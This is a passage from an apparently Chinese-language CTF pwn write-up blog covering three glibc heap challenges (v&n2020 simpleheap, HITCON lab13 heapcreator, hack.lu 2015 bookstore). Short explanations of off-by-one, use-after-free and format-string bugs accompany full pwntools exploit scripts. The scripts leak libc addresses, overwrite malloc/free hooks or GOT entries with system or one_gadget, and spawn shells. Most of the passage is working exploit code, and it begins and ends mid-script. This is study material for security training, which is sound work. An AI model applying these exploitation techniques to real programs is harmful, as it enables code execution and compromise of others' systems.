class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;leak mmap_addr:&quot;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"> </span><br><span class="line">libc_base = mmap_addr + <span class="number">0x22000</span> - <span class="number">0x10</span><span class="comment">#去头加偏移</span></span><br><span class="line">log.success(<span class="string">&quot;leak libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"> </span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">payload2 = pack(<span class="number">1</span>) + pack(book1_addr+<span class="number">0x70</span>) + pack(free_hook_addr) + pack(<span class="number">100</span>)</span><br><span class="line"><span class="comment">#将des1指针替换为free_hook的地址,并修改其为system的地址</span></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, payload2)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>, pack(system_addr))</span><br><span class="line"> </span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>与wiki和大多数博客的不同,我做了一些调整,这个我觉得是更合理的(基于ubuntu20原装环境)</p><p><strong>小记0x1-0x3</strong></p><h2 id="v-amp-n2020招新赛simpleheap"><a href="#v-amp-n2020招新赛simpleheap" class="headerlink" title="v&amp;n2020招新赛simpleheap"></a>v&amp;n2020招新赛simpleheap</h2><p><strong>难度:★★</strong></p><p>这题难度较上一题要明显高出一截</p><p>核心利用是off-by-one以及unsortedbin attack</p><p>程序的漏洞在于其edit函数存在off-by-one，以此来修改下一个chunk的size域</p><p>并利用unsortedbin的切割特性来泄露mainarena+88,来得到libc_base</p><p>再通过伪造一个fakechunk(可写hook)到fastbins链上,使得两次分配得到该chunk并覆写mallochook和reallochook</p><p>不直接覆盖mallochook为onegadget的原因是,四个onegadget的条件都不满足,故只能通过realloc函数来调整栈帧并调用reallochook为one_gadget</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">gdb.attach(p) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"> </span><br><span class="line">one = <span class="number">0x4527a</span></span><br><span class="line">onegadget = libc_base + one</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">b&#x27;\n&#x27;</span><span class="comment">#这两个换行很重要,没有换行就会卡住不知道为什么</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">-----------------------又或者另一个有微小差异的版本--------------------------------------</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./vn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3 阻断top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak-(<span class="number">0x3c4b78</span>)</span><br><span class="line"></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment"># 4与2同时指向0x70</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#换行依然很重要</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#5</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行有小几率会发生段错误，并且gdb无法获取符号表，不知道为什么[<u>无法获取符号表已解决见小记0x6</u>]</p><p>有几处一定要加换行符,大概是因为程序中的edit函数中的read是一个字节一个字节读入的,故空字符会使得read等待输入,而不是继续往下执行直到退出,故需要换行符来触发退出.</p><p><strong>小记0x4</strong></p><h2 id="HITCON-Trainging-lab13-heapcreator"><a href="#HITCON-Trainging-lab13-heapcreator" class="headerlink" title="HITCON Trainging lab13 heapcreator"></a>HITCON Trainging lab13 heapcreator</h2><p><strong>难度:★</strong></p><p>核心利用依然是off-by-one，且off-by-one大概率和chunk-extend利用有关</p><p>这次可以利用off-by-one漏洞达到任意写任意读的目的</p><p>读哪里写哪里是一个关键</p><p>因为程序没有开启pie,所以可以直接得到某个函数的got表地址,此外,got表可修改</p><p>比较方便的利用是修改free的got表</p><p>然后先读出free真实地址以此得到libc基址</p><p>然后再修改free为system函数</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25919)#这道题在buuctf也能找到</span></span><br><span class="line">p=process(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(size)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#free后，原先的contentchunk和头chunk被挂入fastbin，且由于大小合适contentchunk会被取出作为新的头chunk，这样新的头chunk和contentchunk的位置就对调了，从而可写content指针</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">100</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="string">b&#x27;48&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">base=free_addr-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(system_addr))</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)   <span class="comment">#这里不用delete函数是因为跳转到执行system后,就接收不到数据了,recv会堵塞卡住</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题唯一需要注意的就是<strong>确定free-got表这个利用点</strong>,因为free的参数是一个可写指针,这样再修改为system函数,参数就可控了</p><p>而恰好这道题没有pie且got表可写,free-got表是最快捷的突破点,至于修改hook什么的也能做到不过要多花一些功夫</p><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><strong>难度:★★★</strong></p><p>难度不小，非常综合的一题，要用到不少知识</p><p>程序没有开relro和pie</p><p>程序比较易发现的漏洞有</p><ol><li>无限读，程序在读取内容时是仅以出现换行符来判断结束的</li><li>程序在free后没有设置NULL，故存在UAF</li><li>程序结尾存在一个格式字符串漏洞</li></ol><p>写的能力全部在格式化字符串上</p><p>核心关键点在于修改了book2的size后在释放,使得submit获得的chunk就为book2,从而使的dest被overlap以达到控制格式化字符串的目的</p><p>其中book1的内容的控制也算十分精妙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">我们需要让printf堆块处执行格式化的漏洞，就需要让submit功能去帮助我们覆盖，submit功能会加上order1:等这些字符串，不能漏掉，总结后可以得知新申请的堆块内容为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + chunk2 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">因为chunk2已经被delete掉了，所以当复制chunk2中的内容的时候复制的其实是order 1: + chunk1。所以上述可以变为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + Order 1: + chunk1 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">所以我们可以构造第二次的chunk1内容恰好覆盖到dest堆块处。也就是：</span><br><span class="line"></span><br><span class="line">size(Order 1: + chunk1 + \n + Order 2: + Order 1:) == 0x90</span><br><span class="line"></span><br><span class="line">size(chunk1) == 0x90 - 28 == 0x74</span><br></pre></td></tr></table></figure><p>然而单单一次格式化字符串显然并不能达到目的</p><p>故而又要想方设法做到二次利用</p><p>最好的方法自然是.fini_array的利用</p><p>且这道题.fini_array的返回地址恰好与一个onegadget相近,剩下的就都是常规套路了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit1</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter first order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter second order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete2</span>() :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;%2617c%13$hn.%31$p,%28$p&quot;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload)</span><br><span class="line"> </span><br><span class="line">payload2 = <span class="string">b&#x27;5&#x27;</span>+p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#leak --&gt; libc_base</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">data = p.recv(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">ret_addr = p.recv(<span class="number">14</span>)</span><br><span class="line">data = <span class="built_in">int</span>(data,<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">ret_addr = <span class="built_in">int</span>(ret_addr,<span class="number">16</span>) + <span class="number">0x28</span> - <span class="number">0x210</span></span><br><span class="line">libc_base = data - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;ret_addr :&#x27;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#repeat --&gt; change ret_addr --&gt; system_addr(one_gadget)</span></span><br><span class="line">one_shot = libc_base + <span class="number">0x45226</span></span><br><span class="line"><span class="built_in">print</span> 